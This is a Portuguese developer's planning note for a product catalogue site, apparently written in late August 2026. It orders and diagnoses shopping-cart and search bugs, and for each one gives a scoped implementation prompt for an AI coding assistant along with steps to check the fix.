# Bugs do carrinho — 29/08/2026

Ordem de ataque depois dos 3 briefs (ainda **não commitados** no momento em que
isto foi escrito). Um bug por commit — se quebrar, dá pra saber qual mudança foi.

**Passo 0, antes de tudo:** commitar o trabalho dos briefs. Os arquivos abaixo
(`app/cotacao/page.jsx`, `ProductSheet.jsx`) já estão modificados; misturar as
correções do carrinho no mesmo commit apaga a fronteira entre "reconstrução do
catálogo" e "conserto do carrinho".

---

## A ordem, e por quê

A ordem não é por incômodo, é por consequência: **primeiro o que corrompe o
pedido, depois o que incomoda.** O 1 é pré-requisito do 5 — sem linha com
identidade própria não há onde guardar a variante escolhida.
O 2 e o 3 são consertos de interface que só fazem sentido depois que a linha do
carrinho tiver identidade própria. O 4 não depende de ninguém — vai por último
por ser o único que não muda comportamento nem dado.

| # | Bug | Tipo | Estado |
| --- | --- | --- | --- |
| 1 | Variantes colapsam numa linha só | **dado** — o lead sai errado | ✅ feito 29/08 |
| 5 | Imagem e nome não seguem a variante | **dado** — o lead sai errado | ✅ feito 29/08 |
| 2 | Agregar só existe onde há configuração | feedback + qualidade do lead | ✅ feito 30/08 |
| 3 | Carrinho sem volta pro produto + configuração na URL | navegação + link compartilhável | ⬜ |
| 4 | `<select>` de variante fora do DS | estilo | ⬜ |
| 7 | Busca não acha SKU, nem sem acento | **produto** — ensina que o site não tem | ⬜ |
| 8 | Recomendados fora de hora + diagramas U/C com peso de botão | layout | ✅ feito 30/08 |
| 8c | Complemento colado no CTA | layout | ⬜ próximo |
| 9 | Abas da ficha são conteúdo global repetido 36× | conteúdo | ⬜ em aberto (design) |
| 10 | 404 sem identificação no GA4 + beco sem saída | medição | ⬜ baixa, útil na troca de domínio |
| 11 | Política de privacidade não existe neste projeto | **lançamento** | 🔴 antes de trocar o domínio |
| 12 | GA4 dispara em dev — localhost polui os dados do cliente | medição | ⬜ rápido |

**Ordem de execução: 1 → 5 → 2 → 3 → 4.** Os itens 7 e 8 nasceram do brainstorm
de 30/08 e são independentes da fila — o 7 é o de maior valor do que sobrou. Os dois primeiros são bugs de dado: o
pedido que chega na Aida sai errado. O resto é interface.

**1 e 5 saíram em 29/08**, num commit só (`fix: carrinho identifica a
configuração escolhida`) — estavam entrelaçados nos mesmos arquivos e separar
depois não valia o `git add -p`. Inclui a correção do vazio da tapa
(retângulo vazio em vez de foto legendada, ver seção 5).

---

## 1. Identidade da linha do carrinho 🔴 primeiro

**Sintoma (suas palavras):** seleciono outro variante ou ancho, agrego, e no
carrinho só aumenta a quantidade — não entra como produto novo.

**Causa:** `components/CartProvider.jsx:29` — o carrinho deduplica por
`product.id`, que é o id da **página**, não da configuração escolhida. O
`composedSKU` (variante · ancho · material · espesor), montado em
`ProductSheet.jsx:88`, entra só como campo do objeto e não participa da
identidade.

**Consequência real, que é pior que o sintoma:** na hora do merge, o
`CartProvider` mantém o objeto da **primeira** adição (`{ ...i, quantity: +1 }`).
Então a segunda configuração não só não vira linha nova — ela **desaparece**. O
carrinho, o preview do WhatsApp e a linha gravada na planilha da BGA mostram o
SKU da primeira escolha com quantidade 2. A Aida recebe um pedido de 2 unidades
de uma coisa que o cliente pediu uma. É bug de dado, não de UI.

**Junto, o mesmo defeito:** `ProductSheet.jsx:95` faz
`if (qty > 1) updateQuantity(product.id, qty)` — `updateQuantity` **atribui**, não
soma. Agregar 3 e depois mais 3 dá 3, não 6.

**Ponto de decisão (é escolha sua, não bug):** a ficha já vem com material e
espesor pré-selecionados, então adicionar da ficha sempre gera um `composedSKU`
com spec, enquanto adicionar da grade gera o SKU pelado. Com a correção, os dois
viram **linhas separadas** — o que está certo (uma tem spec, a outra é "a
confirmar"), desde que o carrinho mostre a configuração de cada linha. É o que o
prompt abaixo assume.

### Prompt pro Claude Code

```
No carrinho, a identidade da linha é o SKU composto, não o id da página.

Contexto do bug: CartProvider.addItem deduplica por product.id
(components/CartProvider.jsx:29). Quando o usuário escolhe outra variante ou
outro ancho na ficha e agrega, a linha existente só incrementa a quantidade e
mantém o objeto da PRIMEIRA adição — a segunda configuração some do carrinho, do
preview de WhatsApp e do payload que vai pra planilha. É bug de dado: o lead que
chega na vendedora fica errado.

Faça:

1. components/CartProvider.jsx
   - Cada item passa a ser { lineId, product, composedSKU, quantity, observation }.
   - lineId = composedSKU quando existir, senão product.id.
   - addItem(product, quantity = 1): dedupe por lineId; se já existe, SOMA a
     quantidade (não atribui); se não existe, cria linha nova.
   - removeItem / updateQuantity / updateObservation passam a receber lineId no
     lugar de productId.
   - updateQuantity continua ignorando qty < 1.
   - localStorage: trocar a chave 'bga-cart' por 'bga-cart-v2' e ignorar a
     antiga. Os ids de produto mudaram na reconstrução do catálogo — carrinho
     salvo antes disso apontaria pra página que não existe mais.

2. app/catalogo/[categoria]/[produto]/ProductSheet.jsx
   - handleAddToCart: addItem({ ...product, composedSKU }, qty) numa chamada só.
     Remover o updateQuantity de dentro do handler e o updateQuantity do
     useCart() se ficar sem uso.

3. components/AddToCartButton.jsx (grade, recomendados, subfamília)
   - O check `inCart` compara lineId. Sem composedSKU, lineId é product.id —
     comportamento atual preservado.

4. app/cotacao/page.jsx
   - key={lineId} no map; removeItem/updateQuantity/updateObservation recebem
     lineId.
   - Cada linha mostra a configuração escolhida: hoje o composedSKU aparece como
     texto mono; mantenha, mas garanta que duas linhas do mesmo produto com
     configs diferentes sejam visualmente distinguíveis.
   - buildMessage e o payload de registrarCotizacion já usam
     product.composedSKU ?? product.id — conferir que continuam pegando o SKU
     certo por linha.

5. components/CartBadge.jsx — count continua items.length (linhas distintas).

Não mexa em mais nada. Rode `npm run build` no final.
```

---

## 2. Agregar só existe onde a configuração existe 🟡 depois do 1

Cresceu no brainstorm de 30/08 e virou uma regra, não um conserto de botão:
**a ação de agregar só deve existir onde dá para configurar a peça.**

**Sintoma original:** agrego na ficha e o botão volta pro estado original.
`ProductSheet.jsx:96-97` — `setAdded(true)` + `setTimeout(…, 2200)`. É flash com
timer, não estado. Passados 2,2 s a ficha não lembra mais de nada.

**O que o brainstorm acrescentou.** O botão da grade (`AddToCartButton`) agrega
sem configuração nenhuma. Fui contar: das **36 fichas ativas, 34 exigem ancho e
ala**, e nenhuma delas tem `dimensions` fixas; as outras 2
(`salida-horizontal-electroducto`, `salida-lateral-perfilado`) também não — e a
primeira tem 9 variantes de diâmetro. Ou seja: **em 36 de 36, agregar pela grade
produz uma linha sem spec nenhuma.** Não existe um caso em que o botão do card
gere pedido completo. Agora que a linha do carrinho mostra a configuração em
palavras (item 5), essas linhas aparecem visivelmente vazias — e é a Aida que
paga, ligando pra perguntar tudo.

O botão da grade não é atalho, é vazamento. Sai dos três lugares e o
`AddToCartButton.jsx` vira código morto.

**Cor — decidido.** A grade já fazia amarelo → azul escuro; quem estava fora do
padrão era a ficha, que nasce azul e só pisca. Unifica no que já existia:
`brand-accent` → `brand-primary` ao agregar. Com a grade sem amarelo nenhum, o
CTA da ficha vira a coisa mais alta da página, que é onde ele deve estar.

**O que não pode cair no chão.** Os 36 botões eram a principal superfície que
*ensinava* que existe carrinho de cotação. Some com eles e a descoberta some
junto — e hover não ensina nada no celular. A resposta não é manter 36 botões
repetindo mal a mesma coisa: é **dizer uma vez, bem**, numa frase abaixo do H1.
Ela entra no mesmo commit que tira os botões — não se abre um buraco prometendo
tapar depois.

**Ainda aberto, e é decisão sua:** o `CartBadge` também é `brand-accent`. Com o
CTA da ficha amarelo, ficam dois amarelos disputando a mesma tela. Um acento por
tela. Isso encosta na thread 1 do `ESTADO` (estado vazio do badge), que já está
desbloqueada — vale resolver as duas juntas, num commit à parte deste.

### Prompt pro Claude Code

```
Duas mudanças ligadas: o botão de cotização da ficha passa a refletir estado, e
a ação de agregar sai dos cards de produto.

Contexto: agregar pela grade produz uma linha de carrinho sem configuração
nenhuma — em 36 de 36 fichas do catálogo ativo, porque 34 exigem ancho e ala e
as outras 2 têm variantes. A ficha é o único lugar onde a peça pode ser
configurada, então é o único lugar onde "agregar" deve existir.

1. app/catalogo/[categoria]/[produto]/ProductSheet.jsx — botão como estado
   - Remover o state `added` e o setTimeout de 2200ms.
   - Ler do carrinho a linha cujo lineId bate com o composedSKU atual.
   - Fora do carrinho: "Agregar a cotización", bg-brand-accent /
     text-brand-primary (hoje é bg-brand-primary — é essa troca).
   - No carrinho: "✓ En tu cotización (N)", N = quantidade da linha,
     bg-brand-primary / text-white. Abaixo, link discreto "Ver cotización →"
     para /cotacao.
   - O botão segue clicável nesse estado: clicar de novo soma a quantidade atual
     do seletor à linha existente.
   - Trocar variante, ancho, material ou espesor muda o composedSKU e o lineId,
     então o botão volta sozinho para "Agregar a cotización". É o comportamento
     desejado, não regressão.

2. Tirar o AddToCartButton dos cards de produto, nos três lugares:
   app/catalogo/[categoria]/page.jsx, components/CatalogPageClient.jsx,
   components/RecommendedProducts.jsx e
   app/catalogo/[categoria]/[produto]/SubfamilyView.jsx.
   Depois disso components/AddToCartButton.jsx fica sem uso — deletar o arquivo.

3. O card inteiro vira um único link para a ficha
   (/catalogo/{categoryId}/{id}/), envolvendo imagem, SKU, nome e subtexto.
   - Um <a> só: nada de <Link> aninhado. Os <Link> separados de imagem e de
     título somem, absorvidos pelo link do card.
   - Hover: borda brand-accent + leve elevação (shadow-sm). O mesmo tratamento
     em :focus-visible — hover sozinho não existe no teclado nem no toque.
   - O título mantém peso e cor; perde o hover:underline próprio, que agora é
     do card.
   - Os cards ficam mais baixos sem o botão. Não compensar com padding: a grade
     mais densa é o ganho.

4. Uma frase abaixo do H1, em espanhol, explicando o mecanismo — nas duas
   páginas que tinham botão de agregar na grade (/catalogo e a página de
   família). Algo como: "Armá tu lista de productos y pedí cotización — te
   respondemos por WhatsApp." Uma linha, não um parágrafo. Ela substitui a
   descoberta que os botões faziam.

5. GA4: o evento agregar_cotizacion com origen: 'grilla' deixa de existir, e
   isso é esperado — toda adição passa a vir da ficha, com spec. Não criar
   evento substituto.

Não mexer no CartBadge (fica para outro commit). Copy em espanhol.
Rode `npm run build` no final.
```

**Como conferir:** na grade, o card inteiro clica e não há mais botão; na ficha,
agregar deixa o botão azul escuro com a contagem e ele **fica** assim; trocar o
ancho devolve o amarelo. E a frase abaixo do H1 aparece nas duas páginas.

---

## 3. Voltar do carrinho pro produto — com a configuração junto 🟡

**Sintoma:** no carrinho não dá pra voltar pro último produto que eu estava, nem
abrir o produto da lista.

**Causa:** o breadcrumb da `/cotacao` vai pra `/catalogo` (a grade inteira, não de
onde você veio) e os itens da lista são `<div>`, sem link. O objeto da linha tem
`product.categoryId` e `product.id` — a rota já está ali dentro, só não é usada.

São duas voltas diferentes e as duas faltam: **voltar de onde vim** (corrigir o
que acabei de agregar) e **abrir um item da lista** (revisar spec de qualquer
linha). A segunda é a que mais importa: revisar antes de mandar é a função da
página.

### A armadilha que o próprio item 1 criou (vista em 30/08)

Linkar a linha para a ficha "crua" não basta. A pessoa clica em "Tapa para Curva
Horizontal 45° · Ancho 500" e cai numa ficha com a configuração **padrão** —
nenhuma variante escolhida, ancho 50. E como o botão passou a refletir estado
**por configuração** (item 2), ele vai dizer "Agregar a cotización", como se
aquilo não estivesse no carrinho. A pessoa agrega de novo e ganha uma linha
duplicada.

É a mesma classe de bug da sessão inteira — estado que mente — e foi o nosso
`lineId` que a criou.

**Solução escolhida: a configuração viaja na URL.** O link do carrinho carrega
`?variante=…&ancho=…&ala=…&material=…&espesor=…`; a ficha lê no mount e se monta
igual. A volta fica sem perda, o botão diz a verdade sozinho.

**O ganho maior não é o carrinho.** Com a ficha também *escrevendo* a
configuração na URL enquanto a pessoa configura, qualquer configuração vira
**link compartilhável**: a Aida manda pro cliente a peça exata já montada, e o
cliente abre e agrega. Isso vale mais para a vendedora do que a volta do carrinho
vale para o comprador. É `history.replaceState`, não navegação — não polui o
histórico nem re-renderiza a rota.

**Nota de implementação:** ler `window.location.search` dentro de `useEffect`, não
`useSearchParams()`. Com `output: 'export'`, `useSearchParams` exige fronteira de
Suspense e quebra o build sem ela — e como a página é estática, o parâmetro só é
conhecido no cliente de qualquer forma.

### Prompt pro Claude Code

```
A configuração escolhida passa a viajar na URL da ficha, e o carrinho ganha
caminho de volta.

Contexto: hoje a linha do carrinho não é clicável, e se fosse levaria para uma
ficha com a configuração padrão — onde o botão diria "Agregar a cotización"
mesmo com aquela peça já no carrinho, porque o estado do botão é por
configuração (lineId). Resultado seria linha duplicada.

1. app/catalogo/[categoria]/[produto]/ProductSheet.jsx — ler configuração da URL
   - Num useEffect de mount, ler window.location.search (NÃO usar
     useSearchParams: com output 'export' ele exige fronteira de Suspense e
     quebra o build).
   - Parâmetros, em espanhol, batendo com os rótulos da interface:
     variante (sku da variante), material (id), espesor (gauge), e um por eixo
     usando o próprio id do eixo: ancho, ala.
   - Validar tudo contra os dados do produto: variante precisa existir em
     product.variants; valor de eixo precisa existir em ax.values; material em
     globalSpecs.materials; espesor em globalSpecs.thicknesses. Valor inválido
     ou ausente = mantém o default atual. Nunca confiar na URL.

2. Mesma ficha — escrever a configuração na URL
   - Sempre que variante, eixo, material ou espesor mudarem, atualizar a query
     com history.replaceState (não router.push: não queremos navegação nem
     entrada nova no histórico).
   - Só os parâmetros que têm valor. Sem variante escolhida, sem variante= na
     URL.
   - Isso faz de qualquer configuração um link compartilhável — é intencional.

3. components/CartProvider.jsx — a linha guarda a configuração estruturada
   - No meta do addItem, além de image/imageAlt/title/configLabel, guardar
     config: { variante, axes, material, espesor } com os valores crus.
   - ProductSheet.handleAddToCart passa esse config.

4. app/cotacao/page.jsx — linha clicável
   - O bloco de thumb + SKU + título + configLabel vira um <Link> para
     /catalogo/{product.categoryId}/{product.id}/ com a query montada a partir
     de item.config (quando existir; linha sem config linka sem query).
   - Os controles de quantidade, o input de observação e o botão de remover
     ficam FORA do link.
   - Estado de hover discreto no card e o mesmo tratamento em :focus-visible.

5. Voltar pro último produto visitado
   - Em ProductSheet, gravar em sessionStorage ('bga-last-product')
     { href, name } no mount da ficha — href já com a query da configuração.
   - Na /cotacao, se existir, o breadcrumb do topo vira "← Volver a {name}";
     se não existir, mantém "← Catálogo". Ler no useEffect, nunca na render.

6. Manter o "+ Agregar más productos" no fim da lista como está.

Copy em espanhol. Rode `npm run build` no final.
```

**Como conferir:** agregar uma tapa com ancho 500, ir ao carrinho, clicar na
linha. A ficha tem que abrir com a variante Tapa e o ancho 500 já selecionados, e
o botão tem que dizer "✓ En tu cotización (1)" — não "Agregar". Depois copiar a
URL da barra de endereço, abrir em aba anônima e confirmar que a mesma
configuração aparece.

---

## 4. O `<select>` de variante fora do DS 🟢 independente

**Sintoma:** o seletor de "Modelo / variante" está grudado na direita e o
selecionado usa o azul do sistema, não o azul escuro do DS.

**Causa:** `ProductSheet.jsx:228` é o único `<select>` do projeto sem tratamento
— nativo puro. Os outros três já seguem o padrão do DS:

| Onde | Tratamento |
| --- | --- |
| `LandingPage.jsx:322` (rubro do form da LP) | `appearance: none` + chevron Phosphor em wrapper · foco `--bolt` |
| `ProductFinder.jsx:81` (¿No sabés por dónde empezar?) | mesmo padrão, via `landing.module.css` |
| `cotacao/page.jsx:226` (rubro) | mesmo padrão em Tailwind · foco `brand-primary` |
| **`ProductSheet.jsx:228` (variante)** | **nenhum** — chevron e foco do navegador |

Por isso o chevron cola na borda (é o do sistema, com a métrica dele) e a borda
fica azul no foco (é o `:focus` do UA). Não é bug de CSS solto: é o único lugar
onde o padrão não foi aplicado.

**Divergência do DS — resolvida em 29/08, não é bug:** o foco na LP é **amarelo**
(`--bolt`, `border-color` + halo `rgba(255,198,0,.1)`); no catálogo é **azul
escuro** (`brand-primary`). A Yuki confirmou: o amarelo da LP foi escolha
deliberada da época, pra chamar atenção no formulário. **A LP fica como está.**
A regra do DS passa a ser: foco amarelo em formulário de captação (LP), azul
escuro nos controles de configuração do catálogo. Registrar no DS do Figma.

**O que dá pra controlar e o que não dá — importante antes de prometer:**

- **Controle fechado** (borda, chevron, altura, foco): 100% estilizável. É o que
  o prompt abaixo faz, e resolve os dois sintomas que você apontou.
- **Lista aberta** (o realce da opção enquanto o menu está aberto): renderizada
  pelo SO, não pelo CSS da página. `accent-color` influencia no Chromium em
  Windows/Linux; no macOS o popup é nativo e tende a ignorar. **Não confirmei
  isso nesta versão do Chrome** — vale testar antes de dar como resolvido. Se o
  realce da lista aberta precisar ser da marca sem exceção, o caminho é um
  listbox custom (div + teclado + ARIA), que é bem mais trabalho que um fix de
  CSS. Não recomendo agora.

**Onde entra na ordem:** independente dos bugs 1–3, e o bloco do `<select>` não é
tocado por nenhum deles. Deixe por último, como `fix:` isolado — ou pegue
primeiro se quiser um commit de aquecimento antes do refactor do carrinho.

**Decisão de escopo, uma linha:** hoje são 4 selects e 3 implementações. Ou você
copia o padrão pela quarta vez (prompt abaixo, commit pequeno), ou extrai um
`components/SelectField.jsx` e converte os dois de Tailwind (ficha + cotização),
deixando os dois de CSS module quietos. A segunda opção evita a quinta
divergência. O prompt faz a primeira; peça a segunda se preferir.

### Prompt pro Claude Code

```
O <select> de variante da ficha é o único do projeto fora do padrão de DS.
Aplicar nele o mesmo tratamento que app/cotacao/page.jsx:226 já usa.

Em app/catalogo/[categoria]/[produto]/ProductSheet.jsx, no bloco do
"Modelo / variante" (~linha 228):

1. Envolver o <select> numa div `relative`.
2. No select: `appearance-none pr-9 focus:outline-none focus:border-brand-primary
   transition-colors cursor-pointer`, mantendo o resto das classes atuais.
3. Chevron próprio, idêntico ao da /cotacao — SVG Phosphor 14x14 dentro de
   `<div className="pointer-events-none absolute inset-y-0 right-2.5 flex
   items-center">` com `className="text-text-muted"` no svg.
4. Acessibilidade, no mesmo commit: hoje o <label> não está associado ao select.
   Dar id="variante" ao select e htmlFor="variante" ao label.

Em app/globals.css, no :root: `accent-color: #131E29;` (ocean-900) — tentativa de
levar o realce da lista aberta pro azul do DS. Comentar na linha que o efeito
depende do SO/navegador e não vale no popup nativo do macOS.

Não mexer nos outros três selects do projeto (LandingPage.jsx, ProductFinder.jsx,
cotacao/page.jsx). Rode `npm run build` no final.
```

**Como conferir:** lado a lado com o select de "Rubro" da `/cotacao` — fechados,
os dois têm que ficar idênticos. A lista aberta pode continuar com o realce do
sistema; se ficar, é o limite descrito acima, não o fix falhando.

---

## 5. Imagem e nome não seguem a variante (achado em 29/08, depois do fix 1)

**Sintoma:** escolho a tapa, parece que mudou, mas a imagem continua a da
bandeja — e no carrinho fica confuso.

**É maior que a imagem.** No carrinho da captura há duas linhas `CT3211`, que são
**tapas**, e as duas aparecem como:

- foto da bandeja (`cotacao/page.jsx` renderiza sempre `product.images.primary`)
- título "Bandeja Portacables" (`product.name`, que é o nome da *página*)
- a palavra "Tapa" não aparece em lugar nenhum — só codificada no `CT3211`

E vaza pro lead: `buildMessage()` monta `• {SKU} — {product.name} · {qtd} un`, e
o `bga-leads-apps-script.gs:80` monta a linha da planilha com o mesmo `it.nombre`.
**A Aida recebe "CT3211-500 — Bandeja Portacables · 2 un" para uma tapa.** Mesma
classe do bug 1: dado errado no pedido, não enfeite.

**Causa na ficha:** `ProductSheet.jsx:60-62` — a imagem principal depende de
`galleryTab`, um estado manual de miniatura, e nunca de `selectedVariant`. Há
dois controles para a mesma coisa (o seletor de variante e as miniaturas
Pieza/Tapa) e eles não conversam. O `isTapa` já existe na linha 38, só não é
usado para escolher a imagem.

**Restrição de conteúdo — verificada no `catalog.json`, não é palpite:** 22
páginas têm variante de tapa; **só 10 têm render de tapa**. Faltam 12:

`curva-horizontal-recta-90` · `curva-vertical-externa-45` ·
`curva-vertical-interna-45` · `curva-horizontal-45` · `te-horizontal-recto` ·
`te-vertical-ascendente` · `union-cruzeta-recta` · `desnivel-simple` ·
`desvio-horizontal-derecho` · `desvio-horizontal-izquierdo` ·
`reduccion-lateral-derecha` · `reduccion-lateral-izquierda`

Nessas 12, mostrar a foto da peça quando a tapa está escolhida é exatamente o que
confundiu a Yuki.

**Decisão (revisada em 29/08, com a Yuki): retângulo vazio, não foto legendada.**
A primeira proposta era manter a foto da peça com legenda. Está errada, e o
motivo é o próprio bug: o que confundiu não foi a foto errada, foi a foto **não
mudar** ao trocar de variante — a interface disse "não aconteceu nada". Legenda
é o elemento menos lido da tela e não corrige isso; um placeholder corrige,
porque ele muda e o que ele afirma é verdade. No carrinho a legenda nem cabe:
a miniatura tem 56 px, e a foto da bandeja ali é o erro original de novo.

Duas condições para o vazio ler como estado e não como falha:

- **Texto específico.** O genérico que já existe na ficha ("Imagen disponible
  próximamente") diz que o produto não tem foto — falso, tem. Tem que dizer o
  que falta: `Tapa — imagen en preparación`.
- **Mesmo bloco de vazio já usado na ficha** (glifo `⬡` a 10% + texto), para ler
  como estado do sistema, não como imagem que falhou ao carregar.

Efeito colateral desejável: 12 tapas sem render viram 12 buracos visíveis, e
buraco visível vira pedido para o Akira — junto com as 3 imagens de texto
queimado já listadas no `ESTADO`.

**Quem carrega o peso:** com 12 páginas sem render, é a **palavra** que
desambigua, não a foto. Por isso o prompt trata o rótulo como obrigatório e a
imagem como melhoria.

**Zero mudança no Apps Script:** ele monta a linha da planilha a partir do
`it.nombre` que o site manda. Enriquecendo o `nombre` no cliente, a planilha da
BGA já sai certa — sem redeploy do script.

### Alcance — auditei as 36 fichas ativas, não é só a tapa

Hoje só `bandejas` está em modo `catalog`: **36 fichas**, 23 com variantes, 34
com eixos, todas com `images.primary`. A perda de informação no carrinho tem
**três formas**, e a tapa é só a mais visível:

**a) Tapa (22 páginas).** Nome e imagem erradas. Render de tapa existe em 10.
É o caso que você viu.

**b) Variantes de peça (mesmas 22 páginas, 4 variantes cada).** Lisa Tipo U,
Lisa Tipo C, Perforada Tipo U, Perforada Tipo C — **as quatro compartilham o
mesmo e único render da página**. Duas linhas no carrinho com a mesma foto, o
mesmo título e diferença só no código (`CT3011` vs `CT3111`). Aqui **imagem
nenhuma resolve**: teria que existir render por variante, 4 por página × 22
páginas. Não vale. **Só o rótulo resolve** — e é por isso que o fix trata a
palavra como obrigatória e a imagem como melhoria.

(Exceção parcial: `bandeja-portacables` tem os diagramas de corte U e C em
`product.secciones`. Dava pra usar como miniatura de variante, mas cobre U vs C,
não lisa vs perforada. Fica de melhoria opcional, não entra agora.)

**c) Eixos, material e espesor (34 páginas).** O ancho e o ala escolhidos só
existem dentro do SKU composto — o carrinho não os mostra em palavra nenhuma. O
material e o espesor aparecem abreviados (`AISI304 · #14`). Quem confere o
pedido antes de enviar lê código, não lê spec.

**Landmine, ainda não ativa — vale saber:** `ST2239` (perfilados) e `KIT5262`
(escaleras) usam **outro schema de variante** — `{ code, attributes }` em vez de
`{ sku, label, role }`. O `ProductSheet` lê `v.sku` e `v.label`, então nessas
páginas o dropdown renderiza opções em branco e nunca seleciona nada. **Não
quebra nada hoje**, porque `perfilados` e `escaleras` estão em `displayMode:
'pdf'` e não têm rota de ficha. Quebra silenciosamente no dia em que uma dessas
famílias virar `catalog`. Está no prompt como normalização defensiva.

### Prompt pro Claude Code

```
A configuração escolhida tem que aparecer no carrinho em palavras — hoje ela só
existe dentro do SKU composto, e a variante some por completo.

Contexto: a página se chama "Bandeja Portacables" e tem 5 variantes (4 peças +
Tapa). Quem escolhe a tapa vê no carrinho a foto da bandeja, o título "Bandeja
Portacables" e nenhuma menção a tapa; quem escolhe Lisa Tipo C vê exatamente a
mesma linha que Perforada Tipo U. A mesma perda vai pro WhatsApp e pra planilha
do cliente, porque buildMessage e o payload usam product.name.

1. lib/products.js — duas funções puras, para o carrinho e a ficha usarem o
   mesmo texto:
   - buildLineTitle(product, variant): variant.role === 'tapa'
     → `Tapa para ${product.name}`; senão product.name.
   - buildConfigLabel({ variant, axes, material, gauge, globalSpecs }): string
     legível em espanhol, partes separadas por " · ", omitindo o que não existe.
     Ex: "Lisa Tipo C · Ancho 500 mm · Ala 150 mm · Acero inoxidable AISI 304 ·
     Espesor #14". Usar os `name` de globalSpecs.materials e o `label`/`unit` de
     dimensionAxes — nada de abreviação nova.
   - Mover buildComposedSKU do ProductSheet pra cá também, para os três textos
     (SKU, título, config) saírem do mesmo lugar.
   - normalizeVariant(v): aceita { sku, label, role } e o schema antigo
     { code, attributes } → { sku: v.sku ?? v.code, label: v.label ?? (valores
     de attributes juntados por " · "), role: v.role ?? 'pieza' }. Aplicar na
     leitura das variantes. ST2239 e KIT5262 usam o schema antigo e hoje
     renderizariam opções em branco — não estão roteados, mas não deixe a bomba
     armada.

2. app/catalogo/[categoria]/[produto]/ProductSheet.jsx
   - Imagem principal derivada da seleção: kit byAla (atual) > variante com
     role 'tapa' e images.tapa existente > images.primary.
   - Escolher variante role 'tapa' faz setGalleryTab('tapa'); voltar pra 'pieza'
     faz setGalleryTab('primary'). Miniaturas continuam clicáveis pra comparar.
   - Variante tapa sem images.tapa: NÃO mostrar images.primary. Renderizar o
     mesmo bloco de estado vazio que a ficha já usa quando não há imagem (glifo
     ⬡ a 10% + texto), trocando o texto por "Tapa — imagen en preparación".
     A imagem tem que MUDAR ao trocar de variante: é a mudança que comunica.
     São 12 páginas nessa situação.
   - Nesse caso, meta.image vai como null (ver item 3).
   - handleAddToCart passa meta:
     { image: mainImageSrc, imageAlt: mainImageAlt,
       title: buildLineTitle(product, selectedVariant),
       configLabel: buildConfigLabel({...}) }

3. components/CartProvider.jsx
   - addItem(product, quantity = 1, meta = {}) — a linha guarda também
     { image, imageAlt, title, configLabel }. Sem meta, tudo undefined e o
     comportamento atual continua (grade, recomendados, subfamília).

4. app/cotacao/page.jsx — cada linha passa a mostrar, nesta ordem:
   - SKU composto (mono, como hoje)
   - título: item.title ?? product.name
   - configLabel numa linha abaixo, no estilo hoje usado por product.dimensions
     (mesmo tamanho e cor). Quando não houver configLabel, cai no
     product.dimensions atual.
   - thumb: quando a linha tem meta, usar EXATAMENTE item.image — se for null,
     mostrar o bloco "sin imagen" que já existe, nunca cair em
     product.images.primary (foto da bandeja numa linha de tapa é o bug
     original). O fallback para product.images?.primary vale só para linhas
     antigas/sem meta, vindas da grade.
   - buildMessage: a linha do WhatsApp usa item.title, não product.name. O
     configLabel NÃO entra na mensagem — o SKU composto já carrega a spec e a
     mensagem precisa ficar curta.
   - registrarCotizacion: o campo `nombre` de cada item usa item.title.
     NÃO mexer em docs/bga-leads-apps-script.gs — ele monta a linha da planilha
     a partir de it.nombre, então isso já resolve do lado do site.

Copy em espanhol. Rode `npm run build` no final.
```

**Como conferir, nesta ordem:**

1. `bandeja-portacables`: agregar Lisa Tipo C e Perforada Tipo U, mesmo ancho.
   Duas linhas com títulos iguais mas `configLabel` diferente — é o caso (b), o
   que a imagem não resolve.
2. Mesma página: agregar a Tapa. Título "Tapa para Bandeja Portacables" e a foto
   da tapa (essa página tem render).
3. `curva-horizontal-45`: agregar a Tapa. Ao selecionar a tapa a imagem tem que
   **trocar** para o vazio "Tapa — imagen en preparación" — é uma das 12 sem
   render. No carrinho, essa linha fica com a miniatura vazia e o título
   "Tapa para Curva Horizontal 45°".
4. Vista previa WhatsApp: a linha da tapa precisa dizer "Tapa para …".

---

## 6. Threads já desbloqueadas (não são bugs)

Estavam travadas pelos briefs 1 e 2 no `ESTADO-2026-08-29.md`, thread 1. **Os
briefs saíram — estão livres**, e mexem nos mesmos arquivos dos bugs 1–3:

- `CartBadge` invisível com carrinho vazio + `aria-hidden` / `tabIndex={-1}` —
  já tem decisão sua ("carrinho sempre aparece") e uma pergunta em aberto (vazio
  apagado ou só sem contador)
- estado vazio da `/cotacao`, que diz "vazio" duas vezes e não explica o
  mecanismo

Entram nesta rodada ou na seguinte — em commit separado, de qualquer forma.

---

## 7. A busca não encontra quase nada 🔴 alto valor

**Causa:** o filtro compara a query com `p.name` e mais nada
(`CatalogPageClient.jsx:16`). Rodei consultas reais contra o catálogo:

| busca | resultados |
| --- | --- |
| `bandeja perforada 200mm` — **o exemplo do próprio placeholder** | **0** |
| `CT3011` | **0** |
| `CT3211` | **0** |
| `reduccion` (sem acento) | **0** |
| `reducción` (com acento) | 3 |
| `curva 90` | **0** |
| `tapa` | **0** |
| `bandeja` | 1 |

O `ProductFinder` da home promete "bandeja perforada 200mm" no placeholder e essa
busca devolve zero. Os códigos não aparecem porque vivem em `variants[].sku`, e
os ids das páginas viraram slugs na reconstrução. E ninguém digita acento numa
caixa de busca.

Num distribuidor elétrico, onde o cliente do Akira pede por código, uma busca que
não acha `CT3011` é **pior que não ter busca** — ela ensina "esse site não tem".

**Duas metades, e a ordem importa:** primeiro *o que* a busca casa, depois *onde*
existe caixa. A caixa na página de família (que o repeat user precisa, porque
`/catalogo/bandejas` hoje é grid puro sem busca) só vale se o match funcionar.

### O índice enxuto — decidido em 30/08, e é o ponto que não pode ser adiado

O `catalog.json` (150KB, 87 entradas) **vai inteiro pro bundle do cliente**: está
no chunk `476-*.js`. Bandejas populada custa ~2,3KB por página. Com as outras
famílias entrando, a conta cresce linear — ~460KB a 200 páginas, perto de 1MB a
400. Baixado por quem abriu o site pra ver **uma** peça.

Escrever a busca em cima de `getAllProducts()` prende o catálogo inteiro no
bundle **para sempre** — a busca vira a razão pela qual tudo precisa estar lá.
Escrever contra um índice enxuto custa o mesmo hoje e é o que impede isso.
~150-250 bytes por página em vez de 2.300; 400 páginas ≈ 80KB.

### Verificado contra o `catalog.json` (30/08, antes de escrever o prompt)

Protótipo rodado sobre os dados reais: os 7 casos de teste passam, e o índice dá
**13KB / 365 bytes por ficha** (contra 2,3KB por página do `catalog.json`). Três
coisas que o prompt da versão anterior errava:

- **`keywords` é string**, não array — `"bandeja portacables, eletrocalha, …"`.
- **Não existe `sku` no topo do produto** na maioria: só 13 das 87 entradas têm.
  Os códigos vivem em `variants[]`, nos dois formatos (`{sku,label,role}` e
  `{code,attributes}` em `ST2239`/`KIT5262`).
